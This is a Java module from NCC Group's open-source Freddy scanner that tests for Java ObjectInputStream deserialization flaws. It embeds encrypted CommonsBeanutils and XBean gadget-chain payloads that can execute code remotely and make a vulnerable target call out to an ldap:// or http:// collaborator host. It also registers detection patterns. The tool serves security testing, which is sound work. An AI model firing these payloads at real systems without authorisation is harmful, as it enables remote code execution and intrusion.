// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java ObjectInputStream API.
 *
 * Note: All of the ysoserial payloads are valid here along
 *       with the modified payloads used by BaRMIe that
 *       support more versions of the relevant libraries
 *       however these payloads have not yet been
 *       implemented here.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class ObjectInputStreamModule extends FreddyModuleBase {
    //CommonsBeanutils payload data
    private static final int COMBU_PAYLOAD_CMD_OFFSET = 1033;
    private final String COMBU_PREFIX_B64 = decrypt("FjcbnGO0cFGMsEePMO98JMBGgyjCV2YLcavQMSQK/ZzkqK4katfUhXhQ/x1wtDW7EgPBAk/YUsFmVHzn5je8mAP1rxVT7lp6xw7ArNjCoyYRKoNpIUa2+m29BGu1pWDoF2HxZaGweE8ReEMcqxZwxsKzdN1bXMUCzmpVQ0KLaVGDHVG4DfSfdXK3Iw9NMwsGYoHcXqAqf6kpa6LNoBYhYelDnQwWP5y+FrDN/Aj6qkrKlZRh0XDizOUDI8rF6P04mPvyVTL8BFxBLTltKGXVzR/yKKUtDc4NeXvv8bpngqWW7Xpm/iZEisum6kV+xbhuBA0btuKhMebG15FtKn5wzpL9sBIfS1We8CAZF7jVQ94uDYUc9KTVbxDxIEWvhpMMbTqU6jFox8TV/LEyUmLZTYcxov/HeJ9RrCabk7qonb9dBYixewqKjqg6C34w7dvgPzYuvuJDjR15t7dBr0xZZgP7sk101iR/D4Cyn/Mp4pDszfNJrlzNns4IVFa8XE59QZGh/AayjQ3ktZNQd5g3ZBFHizvaBDxG0GFLvZWpEih1S0yeucLowiuN1OwNknk+G3XMj5AAXqJy5LxH6cx8qC5OkrBBg7jRUhfcab1cnAPWARc4zurXjBIvrlyOKmO7laf2zVf/M3m+8kyezCCbmNXMdwAiGT3npuRkeI3wwLIS8fpClWRcx44KBXT//HwX2P0MTXRj9fnTgeQIcVirYmjndHvSc54DMI/Q/JclI7Z2Ta5pAFNyBPvdb6VCEDiA0nbV32C/vFWLFaWac49Dks9criWtaueT3abnvTo/oTNBr7lIvURJ0HyELGJ8tQamilm7ay8cJXm/2G3vBHWgPf9JfGlGBZi9J/7Zyd9ZfghVT9hPoBYnn2nEKgzPbNjiuzD40A2G2X/tACWqzIduuXJ/lSMWiKLMLFhmq5hzk+Qedzr2b+DD7yHdUtWEXI3tybWOAw5Ic7LzUx/kvd/UsRWx+WYQbArttvj2SdAcSG5dMa6HadoWWP/s7ZxpbIp2A5TrksaMoH+lVKuDKsY8r4KrX9joTPj4mf0QSjhAlS3JtsN6qL7P11uaM6aPhNkQQtw8HGJm9eyMZHu721VboCmo2d+dxvUE8QRlbzLHFK/VRetQm0ge5u1YGB+9LZGGnV3bfMckXUNN4iG7uU42MVx4ykP3VhMs5hOEVkUiXhsuNpvRU0DhOwSrAH+gk5Xd948BmcjctnjuSlbCQSxf3rH1IYvB3d640gb07aUBniNNIAGKuVcXyBy8W8aClSw5p57e01kWibZobJw50Mg5pFaKSnHB7UUTBNq0DYArMDCHAWOfUZtXKFDXydqNHzk50dAqkdr8X+MJ1vkzNvyOwih1OR9uPPjiC0kMWpKmo/MvWeULEHqGts1q+ejifgMdliIIP1VtbdniSDi7QSHrEBKCH8w/ZKXRoDAiFyWYBwAFp7S5XEiNcBBe9pJzUrndhPSyXRRmf/DIQ9PY0pyQMuv4j9pA2hoInJcxnOXmwrsGZngeXof8ROKocR1Iv6mWkndNFN5bk6Lqom89HHnYq6cwiMB3AzxmjAilTaLl6vaLFkH39vBv9fTbHEMRRVhyMef3AUF+B7xtU560raqqyH/bjl5BN6b7Qn/EP8bFRChPJL07rrTsJHKZ/TXfb20hLaQHFOoAgmPupFJPs9RK3cji/yFOADRX6EEGzBKUtV3++yb+VZ3DxSNMxSG/LwtTaq1zOhWpEVAb0we0GHqH7j3NDn2zRNkylICd1aaXSHMpfNqsEVJbYDmH6ObuaATRA7Z5hpywyEl/nYW9xDHzIjKYc2PyqT4Zz6voTgHhSBgbZl4fEDSS50oZjRk104d3");
    private final String COMBU_SUFFIX_B64 = decrypt("xc7KCOFJ4YMgjPsiFvmq8UBE9BZXQ/wUKew+JCshck9qq+avznJuKSvTyyG1LgZRh2hP9jxz0ebK1x89NGJNobgGeF6+3DLz8FZXlCyhL7vqndc0lPEFNcUV2gxmfWOVub3ADQRSWg5Mhh7NCXxoePfx95MgBlaDiEwLHyChxT1KtXX2voA2VD1aVwy0gkNAcAR7cASMrQLtsqJ8YXkBHBkHJQ0sncwS4fXcGSoN0hptiLbzG5EH4i+fC7o+qE3hr9m6nyTOuByu+4xI/fylCMhtmTFjiOP8jD/6sFZrYsSGTnqR2ZyE9wVncNq6ncpoTGW+ZL9mul1O0gOX07ovdhasss2zW4wdm1U2dcsC46unvMJAAwYBR+Q4WGFimuCZBJ8N87l+MzzQSYiPeNqZiUrzYsWMkqCj5WdV8mATaXReqdzVifHBh11xnj5Wxxv7ewamg60iRRkkDObcw2+Dk9M7aTDzHgwlg8cSHX4FprBhjwoJiJ8GZS4+HxmBMnVKI9iqgG5Vw6sPd5HDr85cLylAeOpvVw5Gqi5xB2iWh+Bo9aWMHzPCmt2NaBvQrwzHCOY7qvwwfAg15cIOFwXHt4pVIaPbWjLiV+yj1ZjEpygjvbOsBJ1W4orFbr0VaakmaC3cuSJc19UWER9FVqYQtvXV8bfT6gRRW6KRDbZBcGUE0EdKv32+NgBqZz1F377O9weGXKAOehsPqn6OOIORvVexFqE3ETltOoY8vaP5S1g=");
    //XBean payload data
    private static final int XBEAN_PAYLOAD_CMD_OFFSET = 798;
    private final String XBEAN_PREFIX_B64 = decrypt("6Ycaeis01pcQZLl1RYX4LTudeB9XrkzJHajExgol8InJzIz2+sdq4bK/U9eIDl8fh2hP9jxz0ebK1x89NGJNobgGeF6+3DLz8FZXlCyhL7vApvL0nkML9TGlWyv9ceC9SQnI3A8cvvU8jCXXtpWqxH+xFLoyQRWMws01GhpoQsAtmdWmz2Ne6neqlv+lymr5kKUelPselqeXRSlmxuIu05j4jQyPgwfaz/ohXCC3Zup+ksNAV4G5UbKuoAsfhxDzCoR38bQBF+okCT0OJpU/ZeDzx8eQHPY8D4kYU9w7QoI6xCGviu3r1eQk0icfCULV9JCyvltU//2D4UKHDTzikA2u3WFBaz6XAoGRxkoU1El/9+R/weFwg9GX2U8rxSel7cC2qgPDVvFSD429gQw41pEyPWBD4TG9Hz9Drc/nJaePYiwBXgWH8JywH8oBUPgMNAaK6Lq/E6rGQ06dXA/l9dKb2kKOIiLRJ+TjskYWBNkKJPOJNU1Z/750SFvnd3eXmaYOYq5jexVA6giHbP3No7Sr64Hr9gaGbkQDGlObr0EKsp5aRbYoqnA1LzuX4spZ0sh/7yQAHve47/+apw6v6UHdkFgT9sMcRZaz8vjjN8TlqczWEWVsbRBVoT6B1XV+EEIqBcfxr5zmVPc8NcAzFFJWwzk8JXFD7P8I1kGP47lIbGQ0h+pdieo+2522dgGqT9IsO3PdLYMFUs8QMk8J6yLgvjUI/Ob/SyEbivcuGtvO/E7nD1Iez74WYZElvCzerJbqIwfltdVrOzGrRXF4gYhsBc4bdq1X+0y/kx8A1f1vUg1BU4fO41dQeLUBLH4JmMpJ1AlctHzr3evLNszhzqPoksNZzzpS4qjN+QN/+BKzo40q5zqCagoNDvBdpygZIS/XDA+h5b186hd3mhALW4Sufh4aOnKA904S8C2/2XAmWFWAcBffR7yixiNBUh+QaU5FhXt0kYQ9aCiVx/AayiiOnf7lDriFraPGQvGFzi2v0d8Pc6+SYNPZggV69FG1pPQFMzr7i7d6juiRpFcbPjaXFIuBjdPwyTCAjq/niqy283Bup+ehgcr+/ToSAVyy3fT3FDbBlJGXAhK393Un7mnYQ1UgT/3+AbEApzZi0jRF38BmqkNuPSZYez8isZAXTFbDd4p5OAamZ0OpB1Ucv5xOvT+cDiNJOCb3FuhnkT1HlMNpS7R5+2i1okw0OQxEV8eHN+5f7uO48eJ7JteE17NUqWwTOsZiQAa8zhFugNaVhMWXc6ABj4FRPxiCMGdwPXFy27OrRZ+CfkoAsV+BzUtzXw9Sn1zlVoDrZqKvyzEGKcX4V2XSMHhmHEKVZtyjLXOKK8/sX7AqKt6GSSUaZ3MPbaWgJpuLRuMMs+bFoSt5ULH6KiuQsnpQ7TiSAwPnVRrZsCtLlxbGFEESByT30Q==");
    private final String XBEAN_SUFFIX_B64 = decrypt("gfhPrIad3UirQhUtbeRS26dLtj5IX0qdN5kCUlSiuUMwdx42JcXWa++U3TxGCK2BFm3p3PzeBgmy52zCxcVvqE17jZ4eIVufD1tqj8GFrELBpvWp+Z0ToMME9eQ5Wx03PGYaGcq7PD8tse+x5hDT7+puAKn+N7pvmwYzNypTDYYn2+sqV6Olnedm7z/HDGTUcgYM5OvbQhD+u4SzCib+91cKY2fSbCfWlMxlSR4AtFSfWFfzT3WOQBz1ikjFhx8DO22vMHya5JeLqzmKkmyC2/+aJOxyMJ9alHxceTKxCvXX9lO9zWCjS87iyfq/jwR+RWTfPdSgGZwAfIvl41+BxnLzLII/DacUAD9JtJROcNsmd97+gzHYpeB0/51uY7e8kjdQhVWgqqt4m6++PlkwmU6rApbcjUbkTIuUR+jxGlKaA59geQnN+sFAZ1z2x7m2oYHHS8bvDhXnoH5IACEd+tlOsCu5ssljTQP30oW/jXS27cqVOsEN2EEZ/8M+TS7MyHKNmJITEn8sI5Mn8IQYUkpz2tUaBwchS6WddvzccWRmpD8OuVnQdxxKtPjuz7Cv4kO7xM3dRO6IWT8r2Qf5c/zFGxGMuI1feUltdvSgYwv5kV7mDBEwinNJ6QpQQT2pYTmo1AJznJ3ODgRiF2eSTz9a9dh6iUEIOL/HR+qwGM7ukfE08o007bvf2TV7qK/sT43JP7x0e1H/4lyEwHoBBKx+8E0oHEY7Xm/sV33ArY3l/YCPXCjwPu8AU/gLArymBf6eLa4FcaEf73IxvN/DO3lVnMPtrKiaSP6s6+FGgRVAbxAZi9NocAfn+GV8PqMBloTGZq6tLCstAN8NuvQ9uaOh6U0dwd731rTgHSD13Fd25mOSDvTsRvQAQBg7XrY6YKpON4dkxAd5DnhnRlFKZ6dLtj5IX0qdN5kCUlSiuUMwdx42JcXWa++U3TxGCK2Bw6z6t3M01sGGpGXW62EVS1rnqxHp8b1uVXcsV1VFxh7VBU29PvpVDrUHng/Jztd3WFngGxhYH414qPrXcS+uLvuUtiUoWaF2db7pnOm6FDnuktDlet0zYVrqDuctnARLapF5y9GRunoK4wO/EiJBK+rHfHwhc5Ex8ldJp/7y+KNu8/xZbdzojtWW5fnimzIDoljZNeKCbQ0Q7cks1N7ioPrjlTmNAA3s7fuNRAtETtohYxL+pPzlQOvsBw7nBhGPfVPCEeEeSMvOKWUeO2INkcpDaEeQlUfMnzoVVr/gcV4d149DFxwNZLoAa3dWf2BUWQh2LotmaB8u9ze7JVI8m+Xnzpyh1jdNXYNRQ+HnNwtFSlrnSbxqwjTaySM+EHF4J58peFWKyZGBIYVxlhxE6BFEuwbLS4DiI11KwwKco1neAGLlUHsde5oSGfAequWZzkjjbSGbDctiMgs3OyrwHcCPdt0cDgvW+mNORUxgbDKxGXU5kYuE/5RPpLRxxXEzYDm8mrE6NGTfmtKNM2uROa2UDI7KsbB0uxBCxMEQGaLHBoXqlXcJgzETCu/PgXxwlJJQHBUSNTCd3hhLKesyujWFUl0vvrQJdiFLIKhS0QkEpF5ezpfzu6Z7j+3/rI7XbZizGYJRFfxSBtZObZjS17dUYDQCkdlhfQf+9lJ+f+37gfOEmueOXSL33ccLqH7yuz8YC8pTyv5sfqZDam0QCqytvHiFQppob/yMOauKe/NGRc+RMgpvs+y6bOWF22rUblx6SAJNJ/KiGcKhwqFGfARjrazuTR7eRlUW6enP7xNybAS8T+kHUOO1MMPNmOMKMWrXFuVCoF1K512RLa1CgQxPB7QRc/K+ECfZvqtCsrRkzEw2sbfMjg5GC/wrgkNo9lUOvxiRcjwmmGin4p3OkgpcMOcO0j8JArxaMxGsLmZXsRahNxE5bTqGPL2j+UtY");
    private byte[] COMBU_PAYLOAD;
    private byte[] XBEAN_PAYLOAD;

    protected void initialiseModule() {
        setName("ObjectInputStream");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
        XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new byte[]{(byte) 0xac, (byte) 0xed, 0x00}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("java.io.StreamCorruptedException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload(new byte[]{0x00, 0x00, 0x00, 0x00}, "invalid stream header: 00000000");

        registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
        registerActiveScanCollaboratorPayload(PN_XBEAN, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_COMBEANUTILS:
                return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_XBEAN:
                return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
        }
        return null;
    }
}
